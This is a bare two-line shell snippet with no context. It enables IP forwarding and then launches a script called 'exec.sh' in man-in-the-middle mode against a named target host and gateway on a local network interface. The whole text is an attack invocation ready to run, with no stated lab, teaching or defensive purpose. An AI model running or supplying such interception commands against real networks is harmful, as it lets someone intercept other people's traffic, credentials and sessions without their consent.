sudo sysctl -w net.ipv4.ip_forward=1
sudo -E ./exec.sh mitm --target 10.0.0.83 --gateway 10.0.0.1 --interface eth0